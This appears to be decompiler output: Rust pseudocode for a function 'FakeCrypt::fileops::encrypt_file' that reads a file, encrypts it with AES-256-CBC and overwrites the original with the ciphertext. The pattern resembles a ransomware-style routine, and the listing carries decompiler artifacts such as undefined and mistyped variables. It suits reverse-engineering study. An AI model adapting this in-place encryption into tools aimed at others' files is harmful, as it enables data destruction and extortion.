fn FakeCrypt::fileops::encrypt_file(a0: u64, a1: u64, a2: u64, a3: u64) -> int {
    let v0: core::num::niche_types::I32NotAllOnes;  // [bp-0x818]
    let v2: Result<struct4, struct8>;  // [bp-0x810]
    let v3: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x800], Other Possible Types: struct8
    let v4: u64;  // [bp-0x7f0]
    let v5: u64;  // [bp-0x7e8]
    let v6: std::fs::File;  // [bp-0x7d8]
    let v7: core::result::Result<std::fs::File, std::io::error::Error>;  // [bp-0x7b8], Other Possible Types: struct960
    let v8: std::fs::File;  // [bp-0x7b4]
    let v9: struct960;  // [bp-0x3f8]
    let v12: u64;  // rax
    let v13: u64;  // rdx
    let v14: Result<(), &BOT>;  // rax
    let v15: core::result::Result<usize, std::io::error::Error>;  // rax:rdx

    v5 = a0;
    v2 = std::fs::File::open(a0, a1);
    match v2 {
        Err(_) => {
            return;
        },
        Ok(v0) => {
            v3 = Vec::new();
            v15 = <std::fs::File as std::io::Read>::read_to_end(&v0, &v3);
            if let Err(_) = v15 {
                return;
            }
            v3 = alloc::vec::Vec<T,A>::resize((9223372036854775792 & v4) + 16, 0);
            v7 = <aes::autodetect::Aes256 as crypto_common::KeyInit>::new(a2);
            v9 = <cbc::decrypt::Decryptor<C> as crypto_common::InnerIvInit>::inner_iv_init(&v7, a3);
            v12 = cipher::block::BlockEncryptMut::encrypt_padded_mut(&v9, 1, v4, v4);
            if v12 {
                v7 = std::fs::File::create(v5, a1);
                if let Ok(v6) = v7 {
                    v14 = std::io::Write::write_all(&v6 as u64, v12, v13);
                }
            } else {
                eprintln!("[!] Encryption failed for {}: {}", &v5, &v1);
            }
            return;
        },
    }
}
